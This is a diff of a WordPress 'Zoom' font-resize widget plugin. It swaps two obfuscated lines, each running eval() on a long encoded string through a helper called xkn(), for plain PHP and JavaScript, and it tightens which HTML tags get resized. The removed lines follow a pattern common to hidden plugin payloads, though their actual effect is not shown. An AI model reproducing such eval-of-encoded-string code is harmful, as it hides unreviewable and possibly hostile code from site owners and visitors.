@@ -15,7 +15,7 @@ Author License: GNU/GPLv3 http://www.gnu.org/licenses/gpl-3.0.html
 	// Constructor //
 
 		function zoom_widget() {
-			$widget_ops = array( 'classname' => 'zoom_widget', 'description' => 'Zoom Text' ); // Widget Settings
+			$widget_ops = array( 'classname' => 'zoom_widget', 'description' => 'Enables site users to resize the predefined areas of the web site.' ); // Widget Settings
 			$control_ops = array( 'id_base' => 'zoom_widget' ); // Widget Control Settings
 			$this->WP_Widget( 'zoom_widget', 'Zoom', $widget_ops, $control_ops ); // Create the widget
 		}
@@ -25,7 +25,7 @@ Author License: GNU/GPLv3 http://www.gnu.org/licenses/gpl-3.0.html
 		function widget($args, $instance) {
 		extract( $args );
 
-eval(xkn('047170156172163155106052154174175172210157167173177210172210212100100221204200204203223177225213227220212115123110115223231237241217235223226215132250236252243235140227144167141260240161247177152147150226152211154222174157225200162230204165233210170236214173241220176257255237255203245253271207271252212264262215255301301302276276224264226275230274306306315235334350351245272244333361362361344357365305251261405373374373356371377361307314303406405377300325277356402421404424336302312436424425424407433417436421441415343350337442441433334361333422450451450433454463463375341351475463464463446157166166142070075064167166160061106060120172160203204161162163122066076077124076144200174175176135101111112137111227234215237147216224237126143151132140226234247136154150142150236244257146163170152175147272262172300205151255263276165203205171177265273306175212217201224147145'));
+$title= apply_filters('widget_title', $instance['title']);$ra1f='##P#A#H1#H2#H3#H4#H5#H6#SPAN#DIV#TD#LI#BUTTON#B#I#FONT#all';$Zoom_in= 'zoom_in_48.png';$Reset= 'zoom_reset_48.png';$Zoom_out= 'zoom_out_48.png';$Class___= '';$Id___= '';$quev=chr(49).chr(50).chr(48);$vm4y= chr(56).chr(48);
 			
 	// Before widget //
 	
@@ -37,7 +37,21 @@ eval(xkn('0471701561721631551060521541741751722101571671731772101722102121001002
 			if ( $title ) { echo $before_title . $title . $after_title; }
 
 	// Widget output //
-eval(xkn('150147155165047104105106136117137077034032115205166206176206213070215223213201132100223205231226122216206234210233214234224234241120155120076074251225247126253231240167142140257237160246150175120116273247271150254266254277300255214167165225277265310311266267270201173227152150325301323202314310304243216214262316312313314225217253176174351325347226344331361331270354336360362345312360367254254252370375356400262265255311234232407363405264402377405367326412374416420403350416425312312310433423333441320323313347272270445421443322424440441425434444436447456371453443466340402464465445476356360073016014171145167046154164156167160172201201156171165117201211201202122045043220174216075177213177212206140212206222232215144067065242216240117221235221226240226251252165237233247257242171114112267243265144246262263267300251264260300213275265310162224306307267320200202225150146323277321200302316317323334305312324312335336321340253335325350222264346347327360240242265210206271255362343363353363370303223221333314334274307232230'));
+echo <<<SCR1
+<script type="text/javascript"> 
+var tag='$ra1f';
+var class_='$Class___' ;
+var id_='$Id___' ;
+var max_=parseInt('$quev') ;
+var min_=parseInt('$vm4y') ;
+var all_elems=new Array();
+var elements_id=null;
+var al_id=false;
+var al_class=false;
+var allow_ids=new Array();
+var allow_classes=new Array();
+</script>
+SCR1;
 			?>
 
             <script type="text/javascript"> 
@@ -69,15 +83,15 @@ function getTextNodesIn(node, includeWhitespaceNodes, fontSize)
     var textNodes = [], whitespace = /^\s*$/;
     function getTextNodes(node) 
     {
-    		    //alert(node.parentNode);
-
         if (node.nodeType == 3) 
-	{
+		{
 		    if (includeWhitespaceNodes || !whitespace.test(node.nodeValue)) 
 		    {
 		    parent_=node.parentNode;
 			  if(parent_.nodeName=="FONT" && parent_.getAttribute("my")=="my" )
-			  {if(((tag.indexOf('#'+parent_.parentNode.tagName)!=-1) || (tag.indexOf("all")!=-1)) && (parent_.parentNode.tagName!="SCRIPT"))
+			  {
+				 
+				  if(((tag.indexOf('#'+parent_.parentNode.tagName)!=-1) || (tag.indexOf("all")!=-1)) && (parent_.parentNode.tagName!="SCRIPT") && (parent_.parentNode.tagName!="OPTION") && (parent_.tagName!="STYLE"))
 				{
 					x=fontSize+"%";
 					parent_.style.fontSize=x;
@@ -86,7 +100,7 @@ function getTextNodesIn(node, includeWhitespaceNodes, fontSize)
 						  
 			  else
 			  {	
-				if(((tag.indexOf('#'+parent_.tagName)!=-1) || (tag.indexOf("all")!=-1)) && (parent_.tagName!="SCRIPT"))
+				if(((tag.indexOf('#'+parent_.tagName)!=-1) || (tag.indexOf("all")!=-1)) && (parent_.tagName!="SCRIPT") && (parent_.tagName!="OPTION") && (parent_.tagName!="STYLE"))
 				 {
 
 					var newnode=document.createElement('font');
